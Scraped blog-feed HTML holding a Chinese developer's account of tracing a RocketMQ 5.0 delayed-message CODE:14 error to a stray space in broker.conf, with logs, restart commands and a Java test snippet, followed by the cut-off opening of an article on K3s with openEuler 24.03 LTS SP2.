.4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>家人们谁懂啊！昨天在测试环境对接 RocketMQ 5.0 延迟消息，给我整了个大活 —— 本地 5.0/5.3.2 版本跑得飞起，测试环境一发送就报<code>CODE:14</code>，屏幕上 “service not available” 几个字看得我脑壳发麻。和运维折腾了一下午，最后发现凶手居然运维在<strong>配置文件里的一个空格</strong>！这波踩坑经历，简直是 “低级错误教做人” 现场。</p>
<h2 data-id="heading-0">一、现场：测试环境的 “迷之报错”，本地却啥事没有</h2>
<p>先上灵魂暴击的报错日志（就是我当时甩在群里的原版，一字没改）：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-number">2025</span><span class="hljs-selector-tag">-12-03</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">56.172</span> <span class="hljs-selector-tag">ERROR</span> <span class="hljs-number">27112</span> <span class="hljs-selector-tag">---</span> <span class="hljs-selector-attr">[nio-8080-exec-2]</span> <span class="hljs-selector-tag">o</span><span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.C</span>.<span class="hljs-selector-attr">[.[.[/]</span>.<span class="hljs-selector-attr">[dispatcherServlet]</span>    : <span class="hljs-selector-tag">Servlet</span><span class="hljs-selector-class">.service</span>() <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">servlet</span> <span class="hljs-selector-attr">[dispatcherServlet]</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">context</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">path</span> <span class="hljs-selector-attr">[]</span> <span class="hljs-selector-tag">threw</span> <span class="hljs-selector-tag">exception</span> <span class="hljs-selector-attr">[Request processing failed; nested exception is org.apache.rocketmq.client.exception.MQClientException: Send [3]</span> <span class="hljs-selector-tag">times</span>, <span class="hljs-selector-tag">still</span> <span class="hljs-selector-tag">failed</span>, <span class="hljs-selector-tag">cost</span> <span class="hljs-selector-attr">[531]</span><span class="hljs-selector-tag">ms</span>, <span class="hljs-selector-tag">Topic</span>: <span class="hljs-selector-tag">test-delay-msg</span>, <span class="hljs-selector-tag">BrokersSent</span>: <span class="hljs-selector-attr">[broker-a, broker-a, broker-a]</span>
<span class="hljs-selector-tag">See</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//rocketmq.apache.org/docs/faq/ for further details.] with root cause</span>

<span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.exception</span><span class="hljs-selector-class">.MQBrokerException</span>: <span class="hljs-selector-tag">CODE</span>: <span class="hljs-number">14</span>  <span class="hljs-selector-tag">DESC</span>: <span class="hljs-selector-tag">service</span> <span class="hljs-selector-tag">not</span> <span class="hljs-selector-tag">available</span> <span class="hljs-selector-tag">now</span>. <span class="hljs-selector-tag">It</span> <span class="hljs-selector-tag">may</span> <span class="hljs-selector-tag">be</span> <span class="hljs-selector-tag">caused</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-tag">one</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">following</span> <span class="hljs-selector-tag">reasons</span>: <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">broker</span>'<span class="hljs-selector-tag">s</span> <span class="hljs-selector-tag">disk</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">full</span> <span class="hljs-selector-attr">[CL:  0.53 CQ:  0.53 INDEX:  0.53]</span>, <span class="hljs-selector-tag">messages</span> <span class="hljs-selector-tag">are</span> <span class="hljs-selector-tag">put</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">slave</span>, <span class="hljs-selector-tag">message</span> <span class="hljs-selector-tag">store</span> <span class="hljs-selector-tag">has</span> <span class="hljs-selector-tag">been</span> <span class="hljs-selector-tag">shut</span> <span class="hljs-selector-tag">down</span>, <span class="hljs-selector-tag">etc</span>. <span class="hljs-selector-tag">BROKER</span>: <span class="hljs-number">172.28</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.4</span>:<span class="hljs-number">10911</span>
<span class="hljs-selector-tag">For</span> <span class="hljs-selector-tag">more</span> <span class="hljs-selector-tag">information</span>, <span class="hljs-selector-tag">please</span> <span class="hljs-selector-tag">visit</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">url</span>, <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//rocketmq.apache.org/docs/faq/</span>
        <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.MQClientAPIImpl</span><span class="hljs-selector-class">.processSendResponse</span>(MQClientAPIImpl.<span class="hljs-attribute">java</span>:<span class="hljs-number">779</span>) ~<span class="hljs-selector-attr">[rocketmq-client-5.0.0.jar:5.0.0]</span>
        <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.MQClientAPIImpl</span><span class="hljs-selector-class">.sendMessageSync</span>(MQClientAPIImpl.<span class="hljs-attribute">java</span>:<span class="hljs-number">619</span>) ~<span class="hljs-selector-attr">[rocketmq-client-5.0.0.jar:5.0.0]</span>
        <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.MQClientAPIImpl</span><span class="hljs-selector-class">.sendMessage</span>(MQClientAPIImpl.<span class="hljs-attribute">java</span>:<span class="hljs-number">601</span>) ~<span class="hljs-selector-attr">[rocketmq-client-5.0.0.jar:5.0.0]</span>
        <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.MQClientAPIImpl</span><span class="hljs-selector-class">.sendMessage</span>(MQClientAPIImpl.<span class="hljs-attribute">java</span>:<span class="hljs-number">545</span>) ~<span class="hljs-selector-attr">[rocketmq-client-5.0.0.jar:5.0.0]</span>
        <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.producer</span><span class="hljs-selector-class">.DefaultMQProducerImpl</span><span class="hljs-selector-class">.sendKernelImpl</span>(DefaultMQProducerImpl.<span class="hljs-attribute">java</span>:<span class="hljs-number">907</span>) ~<span class="hljs-selector-attr">[rocketmq-client-5.0.0.jar:5.0.0]</span>
        <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.producer</span><span class="hljs-selector-class">.DefaultMQProducerImpl</span><span class="hljs-selector-class">.sendDefaultImpl</span>(DefaultMQProducerImpl.<span class="hljs-attribute">java</span>:<span class="hljs-number">643</span>) ~<span class="hljs-selector-attr">[rocketmq-client-5.0.0.jar:5.0.0]</span>
        <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.producer</span><span class="hljs-selector-class">.DefaultMQProducerImpl</span><span class="hljs-selector-class">.send</span>(DefaultMQProducerImpl.<span class="hljs-attribute">java</span>:<span class="hljs-number">1426</span>) ~<span class="hljs-selector-attr">[rocketmq-client-5.0.0.jar:5.0.0]</span>
        <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.rocketmq</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.producer</span><span class="hljs-selector-class">.DefaultMQProducerImpl</span><span class="hljs-selector-class">.send</span>(DefaultMQProducerImpl.<span class="hljs-attribute">java</span>:<span class="hljs-number">1369</span>) ~<span class="hljs-selector-attr">[rocketmq-client-5.0.0.jar:5.0.0]</span>
</code></pre>
<p>群里运维求助的时候我都懵了：</p>
<ul>
<li>本地搭的 RocketMQ 5.0、5.3.2，发<code>test-delay-msg</code>这个 Topic 的延迟消息，秒发送、秒投递，10 秒延迟精准得很；</li>
<li>切到测试环境，代码一行没改、配置项也都配了，重启 Broker 三次，还是连番报 CODE:14，日志里 “service not available” 快把我眼睛晃瞎了；</li>
<li>甚至怀疑过是不是测试环境的 RocketMQ 不是官方版本，查了安装包，妥妥的官网下载的 5.0 版本…
当时我盯着那行<code>disk is full [CL: 0.53 CQ: 0.53 INDEX: 0.53]</code>还傻呵呵去查磁盘 —— 使用率才 53%，离满格差十万八千里，这报错纯纯 “误导人”！</li>
</ul>
<h2 data-id="heading-1">二、排查：从 “怀疑人生” 到揪出 “空格刺客”</h2>
<h3 data-id="heading-2">第一波排查：把能试的都试了，全白搭</h3>
<p>我跟这个 BUG 死磕的过程，主打一个 “病急乱投医”：</p>
<ol>
<li>查网络：telnet 172.28.200.4:10911，通的；ping Namesrv，延迟正常；</li>
<li>查权限：Topic <code>test-delay-msg</code>的读写权限全开，Producer Group 也没配错；</li>
<li>查延迟等级：用的默认 3 级（10 秒），没超 1-18 的范围；</li>
<li>重启大法：Broker、Namesrv、应用服务轮着重启，报错纹丝不动；</li>
<li>对比版本：本地和测试环境都是 rocketmq-client-5.0.0.jar，版本完全一致。</li>
</ol>
<p>当时我都快怀疑是不是测试环境的 Broker 被 “下咒” 了，甚至翻了 RocketMQ 官方 FAQ，结果 FAQ 里说的 “磁盘满、从节点存储、消息存储关闭”，我这边一个都没中！</p>
<h3 data-id="heading-3">第二波排查：逐字符对比配置文件，发现 “隐形凶手”</h3>
<p>绝望中我把本地和测试环境的<code>broker.conf</code>拉到一起逐行对比 —— 就差拿放大镜看了，终于！在测试环境的配置行里，发现了那个<strong>藏在数字后面的空格</strong>（就是我之前提的 “后面有空格” 的坑）：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05852af8defc477293628cba273cff1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5om-5LmQ5a2Q55qE5p2O5a-75qyi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765426561&amp;x-signature=G5mw%2Bb7yqm5DXhLimuBXhGggSgo%3D" alt="2bf52844b2b2bddde64b79f50e752c85.jpg" loading="lazy"/>
就这一个不起眼的空格，直接把 RocketMQ 5.0 的 Broker 干废了！</p>
<h2 data-id="heading-4">三、破案：为啥一个空格能搞崩延迟消息？</h2>
<p>RocketMQ 5.0 的延迟消息全靠 “定时轮（timerWheel）” 这个核心功能撑着 —— 相当于 Broker 里有个精准的 “闹钟”，到点就把延迟消息推给消费者。而这个 “闹钟” 能不能启动，全看<code>timerPrecisionMs</code>这些配置项的解析结果：</p>
<ol>
<li>RocketMQ 5.0 对配置解析的容错性比老版本低了 N 个档次，等号后多一个空格，它就把<code>1000 </code>（带空格）当成 “非法数字”；</li>
<li>非法配置直接导致定时轮服务初始化失败，延迟消息模块直接躺平，返回 “service not available”（CODE:14）；</li>
<li>更坑的是，这种配置错误不会在 Broker 启动日志里报错，只会在发延迟消息时炸锅，纯纯的 “暗箭伤人”！</li>
</ol>
<h2 data-id="heading-5">四、救场：三步送走这个 “空格刺客”</h2>
<h3 data-id="heading-6">第一步：给配置文件 “刮胡子”—— 删光多余空格</h3>
<p>把测试环境<code>broker.conf</code>里所有配置项的多余空格全清掉，保证<code>key=value</code>是 “无缝衔接” 的状态：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 修正后的正确配置</span>
<span class="hljs-attr">timerWheelEnable</span> = <span class="hljs-literal">true</span>
<span class="hljs-attr">timerPrecisionMs</span>=<span class="hljs-number">1000</span>
<span class="hljs-attr">timerRollWindowSlot</span>=<span class="hljs-number">86400</span>
</code></pre>
<p>别嫌麻烦，每一行都要检查！尤其是复制粘贴来的配置，很容易带空格。</p>
<h3 data-id="heading-7">第二步：重启 Broker，验证配置是否生效</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 先停掉摆烂的Broker</span>
sh mqshutdown broker
<span class="hljs-comment"># 用干净的配置重启</span>
<span class="hljs-built_in">nohup</span> sh mqbroker -c ../conf/broker.conf &amp;
<span class="hljs-comment"># 检查定时轮服务是否正常启动</span>
sh mqadmin getBrokerConfig -n 127.0.0.1:9876 -b 172.28.200.4:10911 | grep <span class="hljs-string">"timerWheelEnable"</span>
</code></pre>
<p>只要输出<code>timerWheelEnable=true</code>，说明 “闹钟” 终于正常工作了。</p>
<h3 data-id="heading-8">第三步：测试延迟消息，终于扬眉吐气</h3>
<p>重新写了行测试代码，手都抖着点了运行：</p>
<pre><code class="hljs language-ini" lang="ini">// 测试延迟消息发送
DefaultMQProducer <span class="hljs-attr">producer</span> = new DefaultMQProducer(<span class="hljs-string">"test-producer-group"</span>)<span class="hljs-comment">;</span>
producer.setNamesrvAddr("172.28.200.4:9876")<span class="hljs-comment">;</span>
producer.start()<span class="hljs-comment">;</span>

Message <span class="hljs-attr">msg</span> = new Message(<span class="hljs-string">"test-delay-msg"</span>, <span class="hljs-string">"终于能发延迟消息了！"</span>.getBytes())<span class="hljs-comment">;</span>
msg.setDelayTimeLevel(3)<span class="hljs-comment">; // 10秒延迟</span>
SendResult <span class="hljs-attr">result</span> = producer.send(msg)<span class="hljs-comment">;</span>
System.out.println("发送成功！消息ID：" + result.getMsgId())<span class="hljs-comment">;</span>

producer.shutdown()<span class="hljs-comment">;</span>
</code></pre>
<p>10 秒后，消费者日志弹出 “终于能发延迟消息了！”—— 那一刻，我直接在工位上长舒一口气！</p>
<h2 data-id="heading-9">五、血的教训：RocketMQ 5.0 延迟消息的 “细节暗杀”</h2>
<ol>
<li><strong>配置文件别瞎加空格</strong>：5.0 版本对配置格式是 “处女座级别的严格”，等号前后、行尾的空格都可能触发隐藏 BUG；</li>
<li><strong>延迟消息 = 定时轮 + 配置</strong>：发延迟消息前，先查<code>timerWheelEnable</code>是不是 true，别等报错了才回头；</li>
<li><strong>本地能跑≠测试环境能跑</strong>：环境差异要 “逐字符对比”，尤其是配置文件，别嫌麻烦，早对比早省心；</li>
<li><strong>CODE:14 别只看磁盘</strong>：这个报错的误导性极强，磁盘满只是其中一个原因，配置错误才是高频坑！</li>
<li>最后友情附赠个小技巧：把配置文件复制到记事本里开 “显示所有字符”，空格、换行这些 “隐形刺客” 立马现形！</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从数据中心到边缘：基于 openEuler 24.03 LTS SP2 的 K3s 轻量化云原生实战评测]]></title>    <link>https://juejin.cn/post/7579553111473094710</link>    <guid>https://juejin.cn/post/7579553111473094710</guid>    <pubDate>2025-12-04T05:05:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579553111473094710" data-draft-id="7579553111473078326" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从数据中心到边缘：基于 openEuler 24.03 LTS SP2 的 K3s 轻量化云原生实战评测"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T05:05:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="澪贰"/> <meta itemprop="url" content="https://juejin.cn/user/4273130296076410"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从数据中心到边缘：基于 openEuler 24.03 LTS SP2 的 K3s 轻量化云原生实战评测
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4273130296076410/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    澪贰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T05:05:32.000Z" title="Thu Dec 04 2025 05:05:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>@[toc]</p>
<p><strong>摘要：</strong></p>
<blockquote>
<p>云原生已成为驱动数字基础设施演进的核心动力。作为承载这一切的基石，操作系统正面临着向全场景、高效率、强安全转变的深刻挑战。<code>openEuler</code>，作为面向数字基础设施的开源操作系统，其最新发布的 <strong>openEuler 24.03 LTS SP2</strong> 版本，搭载了革命性的 <strong>Linux 6.6 内核</strong>，为云原生应用提供了前所未有的性能与稳定性。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2adc8af10d474dcab15501015d10ffe9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=VHu%2B1G50ETt2M5A9%2FopnBFDR6Mw%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-0">一、 时代浪潮：云原生的“全场景”挑战</h2>
<p>云原生（<code>Cloud Native</code>）代表着一套构建和运行应用程序的架构理念和技术合集，其核心支柱——容器化、微服务、<code>CI/CD</code> 和 <code>DevOps</code>——旨在构建松耦合、可弹性伸缩、高容错的系统。</p>
<p>这种范式对底层的操作系统提出了极为苛刻的要求：</p>
<ol>
<li><strong>极致的资源效率：</strong> 无论是数据中心的高密度容器部署，还是边缘设备的资源受限，操作系统自身的开销都必须被压缩到极致</li>
<li><strong>敏捷的调度与隔离：</strong> 内核必须具备更低延迟的进程调度能力（如 <code>EEVDF</code>）和更精细的 <code>Cgroups</code> 机制，以实现海量容器的快速启停和严格隔离</li>
<li><strong>强大的网络与I/O：</strong> 微服务间的频繁通信和有状态应用的数据持久化，高度依赖高性能、低延迟的网络堆栈和异步 <code>I/O</code> 处理能力（如 <code>io\_uring</code>）</li>
<li><strong>内建的安全与可观测性：</strong> 安全必须“左移”到 <code>OS</code> 层，而 <code>eBPF</code> 等技术带来的深度可观测性也已成为标配</li>
</ol>
<p>传统的通用操作系统在这些方面往往力不从心。而 <code>openEuler 24.03 LTS SP2</code> 不仅着眼于数据中心的“重量级”<code>K8s</code> 场景，其高效的内核与轻量化的设计，使其同样擅长应对云原生在边缘和开发环境中的“轻量级”挑战</p>
<h2 data-id="heading-1">二、 技术深潜：openEuler 24.03 LTS SP2 的云原生“核动力”</h2>
<p><code>openEuler 24.03 LTS SP2</code> 的最大亮点是其搭载了<strong>Linux 6.6 内核</strong>。这个内核版本带来了多项对云原生场景至关重要的底层革新：</p>
<ul>
<li><strong>EEVDF 调度器 (Earliest Eligible Virtual Deadline First)：</strong> <code>6.6</code> 内核正式启用了 <code>EEVDF</code> 调度器以取代传统的 <code>CFS</code>。对于云原生微服务而言，这意味着更公平、更低延迟的 <code>CPU</code> 资源分配，能有效缓解高并发下的“长尾延迟”问题，这对于时延敏感的边缘 <code>AI</code> 应用尤为关键。</li>
<li><strong>io_uring 的持续进化：</strong> 作为 <code>Linux</code> 异步 <code>I/O</code> 的未来，<code>io\_uring</code> 在 <code>6.6</code> 内核中得到了极大增强，提升了 <code>I/O</code> 密集型应用（如数据库、消息队列）的性能。</li>
<li><strong>内存管理与 Cgroups 优化：</strong> 对内存管理和 <code>Cgroup v2</code> 的精细打磨，使得容器的资源视图更精确，内存回收效率更高，从而支持在资源受限的设备上运行更多服务</li>
</ul>
<p>除了强大的内核，<code>openEuler</code> 自身的生态工具链，如轻量化容器引擎 <code>iSula</code>（可与 <code>K3s</code> 底层的 <code>Containerd</code> 协同工作）和智能运维 <code>A-Ops</code>，共同构筑了其“全场景”云原生的技术护城河</p>
<h2 data-id="heading-2">三、 实战演练：K3s on openEuler 24.03 - 打造极致轻量化云原生底座</h2>
<p>对于开发者和边缘计算场景而言，部署一个完整的 K8s 集群过于沉重。因此，我们选择评测 <code>openEuler 24.03 LTS SP2</code> 运行 <code>K3s</code> 的表现。<code>K3s</code> 是一个经 <code>CNCF</code> 认证的、轻量级的 <code>K8s</code> 发行版，它将 <code>K8s</code> 组件打包为单个二进制文件，极大简化了部署和运维，是边缘计算和开发者环境的理想选择</p>
<p><strong>环境准备：</strong></p>
<ul>
<li>一台虚拟机，安装 <code>openEuler 24.03 LTS SP2</code></li>
<li>配置：至少 <code>2C2G</code> 内存（<code>K3s</code> 非常轻量，但仍需基本资源）</li>
</ul>
<p><strong>推荐按此配置：</strong>
